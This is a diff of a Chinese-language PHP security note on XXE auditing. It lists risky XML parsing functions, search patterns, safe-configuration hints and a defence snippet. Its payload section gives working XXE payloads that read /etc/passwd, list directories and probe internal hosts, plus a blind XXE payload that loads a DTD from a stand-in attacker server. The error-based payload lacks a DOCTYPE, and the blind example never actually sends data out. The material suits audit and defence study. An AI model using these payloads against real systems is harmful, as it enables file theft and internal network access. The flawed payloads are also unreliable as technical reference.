@@ -1,37 +1,110 @@
-xxe常见危险函数
+# XXE 常规审计思路
 
-// SimpleXML
-$xml = simplexml_load_string($user_input);
-$xml = simplexml_load_file($user_input);
+> XML External Entity — XML 外部实体注入
+
+## 危险函数（PHP）
+
+```php
+// SimpleXML（最常见）
+simplexml_load_string($user_input);   // 危险!
+simplexml_load_file($user_input);     // 危险!
 
 // DOMDocument
 $dom = new DOMDocument();
-$dom->loadXML($user_input);  // 危险
-$dom->load($user_input);     // 危险
+$dom->loadXML($user_input);           // 危险!
+$dom->load($user_input);              // 危险!
 
 // XMLReader
 $reader = new XMLReader();
-$reader->XML($user_input);   // 危险
-$reader->open($user_input);  // 危险
+$reader->XML($user_input);            // 危险!
+$reader->open($user_input);           // 危险!
+
+// XMLParser
+$parser = xml_parser_create();
+xml_parse_into_struct($parser, $user_input, $values);
 
 // SimpleXML + DOMDocument 组合
 $sxe = simplexml_import_dom($dom);
+```
 
-$parser = xml_parser_create();
-xml_parse_into_struct($parser, $user_input, $values);
-xml_parser_set_option($parser, XML_OPTION_SKIP_WHITE, 1);
+## 审计关注点
 
-// 危险：默认允许外部实体
-$dom = new DOMDocument();
-$dom->loadXML($xml);
+```
+搜索：
+  loadXML(
+  simplexml_load_
+  XMLReader::XML(
+  XMLReader::open(
+  LIBXML_NOENT    ← 这个选项会展开实体！
+  LIBXML_DTDLOAD  ← 这个选项允许加载DTD
+```
 
-// 危险：LIBXML_NOENT 实际上会展开实体
-$dom->loadXML($xml, LIBXML_NOENT);
+### 安全配置识别
 
-// 直接使用用户输入的XML
-$xml_data = $_POST['xml_data'];
-$result = simplexml_load_string($xml_data);
+```
+libxml_disable_entity_loader(true);  ← 安全的！
+LIBXML_NOENT                        ← 危险的，会展开实体
+未设置 LIBXML_NOENT + LIBXML_DTDLOAD → 大多数情况下默认安全
+设置 LIBXML_NOENT                   → 明确危险
+```
 
-// 从用户提供的URL加载XML
-$url = $_GET['feed_url'];
-$rss = simplexml_load_file($url);
+## XXE Payload
+
+### 1. 文件读取
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<root>&xxe;</root>
+```
+
+### 2. 目录列表（PHP）
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///">
+]>
+<root>&xxe;</root>
+```
+
+### 3. SSRF + XXE
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "http://内部IP:端口/">
+]>
+<root>&xxe;</root>
+```
+
+### 4. 带外数据（Blind XXE）
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY % xxe SYSTEM "http://攻击者服务器/evil.dtd">
+  %xxe;
+]>
+<root>&send;</root>
+```
+**evil.dtd:**
+```xml
+<!ENTITY send SYSTEM "file:///etc/passwd">
+```
+
+### 5. 报错 XXE（Error-based）
+```xml
+<?xml version="1.0"?>
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+%eval;
+%error;
+```
+
+## 防御
+
+```php
+// PHP 8.0+ 默认已禁用外部实体加载
+// 旧版本手动防御:
+libxml_disable_entity_loader(true);
+$xml = simplexml_load_string($input);
+```
